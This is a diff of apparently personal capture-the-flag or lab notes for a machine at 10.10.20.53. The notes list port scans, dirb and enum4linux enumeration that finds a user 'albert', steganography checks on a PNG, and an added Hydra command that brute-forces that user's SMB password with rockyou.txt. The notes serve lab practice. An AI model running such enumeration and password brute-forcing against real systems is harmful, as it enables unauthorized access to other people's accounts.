@@ -10,7 +10,7 @@
       139/tcp open netbios-ssn
       445/tcp open microsoft-ds
 
-2.Enumerate IP
+2.Enumerate 
 
     A. dirb http://10.10.20.53
 
@@ -22,6 +22,10 @@
                             Disallow: /crossroads.png
                   c. server-status
 
+    B. enum4linux 10.10.20.53
+
+          results: albert 
+
 3. Enumerate PNG file
 
     A. zsteg crossroads.png
@@ -30,19 +34,12 @@
 
                   b2,b,msb,xy  ..  file: OpenPGP Secret Key
 
+    B. exiftool (jpg or png)
 
-4. Enumerate PNG file
+4. Get password with Hydra
 
-    A. binwalk -e crossroads.png
+    A. hydra -l albert -P rockyou.txt smb://10.10.20.53
 
-          results: Zlib compressed data, default compression
+    
 
-          created file: _crossroads.png.extracted
-
-    B. zsteg b2,b,msb,xy crossroads.png > crossr.gpg
-
-    C. Verify the type of data extracted
-
-          file crossr.gpg
-
-          results: crossr.gpg: OpenPGP Secret Key 
+  
